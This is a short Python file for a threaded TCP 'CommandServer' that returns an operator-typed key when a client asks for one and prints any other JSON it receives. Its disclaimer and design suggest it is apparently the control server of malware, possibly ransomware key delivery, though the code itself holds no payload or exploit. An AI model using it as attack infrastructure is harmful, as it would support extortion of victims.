# MIT License
# Copyright (c) 2025 Warren Coleman
# 
# This software is provided for educational and research purposes only.
# Unauthorized use of this tool for malicious purposes is illegal.

import socket
import threading
import json

class CommandServer:
 
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.server = None

    def handle_client(self, connection, address):
        print(f"[NEW CONNECTION] {address} connected")

        with connection:
            try:
                data = connection.recv(1024)
                if not data:
                    return
                
                json_data = json.loads(data.decode())
                if 'request' in json_data and json_data['request'] == 'key':
                    print(f"Send key to: {address}")
                    key = input("Provide the key:")
                    response = json.dumps({'key': key})
                    connection.sendall(response.encode())
                else:
                    print(f"Received: {json_data}")
            except:
                print("Invalid JSON received")

    def start(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        print(f"[LISTENING] Server is listening on {self.host}")
        
        try:
            while True:
                connection, address = self.server.accept()
                thread = threading.Thread(target=self.handle_client, args=(connection, address))
                thread.start()
                print(f"[ACTIVE CONNECTIONS] {threading.active_count() - 1}")
        except KeyboardInterrupt:
            print("Shutting server down")
        finally: 
            self.server.close()

if __name__ == "__main__":
    HOST = '0.0.0.0'
    PORT = 9672

    command_server = CommandServer(HOST, PORT)
    command_server.start()